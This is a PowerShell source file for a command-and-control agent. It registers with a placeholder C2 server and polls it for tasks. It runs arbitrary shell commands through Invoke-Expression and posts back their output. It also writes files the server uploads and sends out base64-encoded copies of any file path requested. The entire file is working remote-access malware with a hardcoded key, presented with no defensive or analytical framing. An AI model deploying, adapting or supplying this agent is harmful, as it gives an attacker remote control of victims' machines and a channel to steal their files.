# Agent.ps1
$C2_SERVER_IP = "http://C2-SERVER-IP:80"
$auth = "MySecretKey123"
$POLL_INTERVAL = 2

# Register agent
$response = Invoke-RestMethod -Uri "$C2_SERVER_IP/register" -Method Post -Headers @{Authorization="Bearer $auth"}
$agent_id = $response.agent_id

function Send-Result($content) {
    Invoke-RestMethod -Uri "$C2_SERVER_IP/result/$agent_id" -Method Post -Body $content -Headers @{Authorization="Bearer $auth"}
}

while ($true) {
    $taskResponse = Invoke-RestMethod -Uri "$C2_SERVER_IP/task/$agent_id" -Method Get -Headers @{Authorization="Bearer $auth"}
    $task = $taskResponse.task

    if ($task -and $task -ne "null") {
        try {
            $parsed = $null
            try { $parsed = ConvertFrom-Json $task -ErrorAction Stop } catch {}

            if ($parsed -and $parsed.type) {
                switch ($parsed.type) {
                    "put" {
                        # PUT
                        $filename = $parsed.filename
                        $data = [System.Convert]::FromBase64String($parsed.data)
                        [IO.File]::WriteAllBytes($filename, $data)
                        Send-Result "[FILE RECEIVED] $filename"
                    }
                    "get" {
                        # GET
                        $path = $parsed.path
                        if (Test-Path $path) {
                            $fileBytes = [IO.File]::ReadAllBytes($path)
                            $b64 = [System.Convert]::ToBase64String($fileBytes)
                            $payload = @{type="file"; filename=[IO.Path]::GetFileName($path); data=$b64} | ConvertTo-Json
                            Send-Result $payload
                        } else {
                            Send-Result "[ERROR] File not found: $path"
                        }
                    }
                    default {
                        Send-Result "[ERROR] Unknown task type: $($parsed.type)"
                    }
                }
            } else {
                # Normal shell command
                $result = Invoke-Expression $task 2>&1 | Out-String
                Send-Result $result
            }
        } catch {
            Send-Result "[ERROR] $_"
        }
    }

    Start-Sleep -Seconds $POLL_INTERVAL
}
